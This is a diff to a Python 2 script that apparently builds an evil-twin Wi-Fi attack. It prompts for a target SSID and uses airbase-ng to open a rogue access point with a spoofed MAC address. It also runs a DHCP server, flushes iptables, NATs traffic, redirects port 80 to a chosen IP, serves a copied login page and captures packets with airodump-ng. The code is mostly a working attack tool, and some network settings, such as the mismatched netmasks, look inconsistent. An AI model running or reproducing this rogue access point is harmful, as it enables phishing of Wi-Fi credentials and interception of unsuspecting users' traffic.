@@ -52,17 +52,15 @@ sniff(iface=mon_iface, prn= PacketHandler)
 ######## making a backup of DHCPD
 print '*'*20
 print "making a backup of DHCPD"
-os.system("mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.backup")
+os.system("mv /etc/dhcp3/dhcpd.conf /etc/dhcp3/dhcpd.conf.backup")
 
 
 ##### creating a DHCPD script
 print '*'*20
 print "creating a DHCPD script"
-dhcpd_file = open("/etc/dhcp/dhcpd.conf", "wb")
-dhcpd_file.write("authoritative;\ndefault-lease-time 600;\nmax-lease-time 7200;\nsubnet 192.168.1.128 netmask 255.255.255.128 {\n\toption subnet-mask 192.168.1.128;\n\toption broadcast-address 192.168.1.255;\n\toption routers 192.168.1.129;\n\toption domain-name-servers 8.8.8.8;\n\trange 192.168.1.130 192.168.1.140;\n}")
+dhcpd_file = open("/etc/dhcp3/dhcpd.conf", "wb")
+dhcpd_file.write("ddns-update-style ad-hoc;\ndefault-lease-time 600;\nmax-lease-time 7200;\nsubnet 192.168.1.128 netmask 255.255.255.128 {\n\toption subnet-mask 255.255.255.128;\n\toption broadcast-address 192.168.1.255;\n\toption routers 192.168.1.129;\n\toption domain-name-servers 8.8.8.8;\n\trange 192.168.1.130 192.168.1.140;\n}")
 
-
-dhcpd_file.close()
 # GET USER INPUT FOR SSID
 
 SSID = raw_input('Enter the target SSID: ')
@@ -72,7 +70,8 @@ CHANNEL = raw_input('Enter the channel for SSID: ')
 ################ CONNECT TO WIRELESS NETWORK #########
 def connect_wireless():
 	os.system("iwconfig "+wireless_interface+" essid " + SSID)
-
+	####### i need to enable it later
+	#os.system("dhclient "+wireless_interface)
 	
 	#os.system("sudo iw dev "+wireless_interface+" disconnect")
 	print '*'*20
@@ -105,6 +104,8 @@ def get_login_page():
 	index_page.write(new_login)
 	index_page.close()
 	time.sleep(10)
+	############# disconnecting from wireless network
+	#os.system("sudo iw dev "+wireless_interface+" disconnect")
 
 ########## CONNECTING TO THE WIRELESS NETWORK
 connect_wireless()
@@ -118,7 +119,7 @@ os.system('firefox http://localhost/index.html &')
 time.sleep(3)
 print '*'*20
 print "Creating a hotspot"
-os.system("gnome-terminal -x airbase-ng -e '"+SSID+"' -c "+str(CHANNEL)+" -P "+mon_iface+" &")
+os.system("gnome-terminal -x airbase-ng -e '"+SSID+"' -c "+str(CHANNEL)+" -a ec:1a:59:0e:0c:33 "+mon_iface+" &")
 
 internet_ip = raw_input('Enter the outbound IP address: ')
 
@@ -126,8 +127,11 @@ print '*'*20
 print 'Setting up DHCP Server'
 ########### SETTING UP THE DHCPD SERVER
 os.system("ifconfig at0 up")
-os.system("ifconfig at0 192.168.1.129 netmask 255.255.255.128")
+os.system("ifconfig at0 192.168.1.129 netmask 255.255.255.0")
 os.system("route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129")
+os.system("dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0 &")
+os.system("/etc/init.d/dhcp3-server start")
+
 
 
 ######### setting up a NAT
@@ -137,30 +141,20 @@ os.system("iptables --flush")
 os.system("iptables --table nat --flush")
 os.system("iptables --delete-chain")
 os.system("iptables --table nat --delete-chain")
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-os.system("iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
+#os.system("iptables --table nat --append POSTROUTE --out-interface eth0 -j MASQUERADE")
 os.system("iptables --append FORWARD --in-interface at0 -j ACCEPT")
-
-
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+internet_ip+":80")
 os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-
-############# SETTING UP DHCP SERVER
-print '*'*20
-print 'Setting up DHCP Server for Client'
-print '*'*20
-time.sleep(3)
-os.system("/usr/sbin/dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0")
-time.sleep(3)
-os.system("/etc/init.d/isc-dhcp-server start")
 
 
 ########## CREATING AIRDUMP
 print "CREATING AIRDUMP\n"
 print '*'*20
 os.system("mkdir capture")
-os.system("gnome-terminal -x airodump-ng -c "+CHANNEL+" mon0 -w capture/"+SSID)
+os.system("gnome-terminal -x airodump-ng --bssid 'ec:1a:59:0e:0c:33' -c "+CHANNEL+" mon0 -w capture/"+SSID)
 
 ############# STOP MONITORING INTERFACE
 print '*'*20
